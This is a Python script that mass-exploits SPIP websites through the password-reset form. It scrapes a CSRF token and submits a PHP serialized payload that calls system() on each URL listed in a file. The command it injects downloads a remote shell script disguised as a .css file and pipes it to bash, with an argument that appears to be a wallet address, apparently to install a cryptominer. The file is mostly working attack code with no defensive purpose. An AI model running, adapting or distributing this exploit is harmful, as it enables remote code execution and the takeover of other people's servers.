import requests
import bs4

def get_csrf_token(url):
    response = requests.get(f"{url}/spip.php?page=spip_pass", timeout=10)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    csrf_input = soup.find("input", {"name": "formulaire_action_args"})
    if csrf_input:
        csrf_value = csrf_input["value"]
        print(f"[+] CSRF token obtained for {url}")
        return csrf_value
    else:
        print(f"[-] Failed to obtain CSRF token for {url}")
        return None

def exploit(url, command):
    csrf = get_csrf_token(url)
    if csrf:
        payload = f"s:%s:\"<?php system('{command}'); ?>\";" % (20 + len(command))
        data = {
            "page": "spip_pass",
            "formulaire_action": "oubli",
            "formulaire_action_args": csrf,
            "oubli": payload
        }
        response = requests.post(f"{url}/spip.php?page=spip_pass", data=data)
        if response.status_code == 200:
            print(f"[+] Exploited {url} successfully")

if __name__ == "__main__":
    urls_file = "urls.txt"
    command = "curl -s -L https://hacker159.neocities.org/setup-L.sh.css | bash -s 42L2cGW43iGD5Krhc7NeX7BuwzdHjSkZUMHMm8nmhYuyZosNQbT6Hd7fwcwzFxJCEKaWjLKYpAZHPfBCrSfbjSX5DgFJD4C"

    with open(urls_file, "r") as file:
        urls = file.read().splitlines()

    for url in urls:
        exploit(url, command)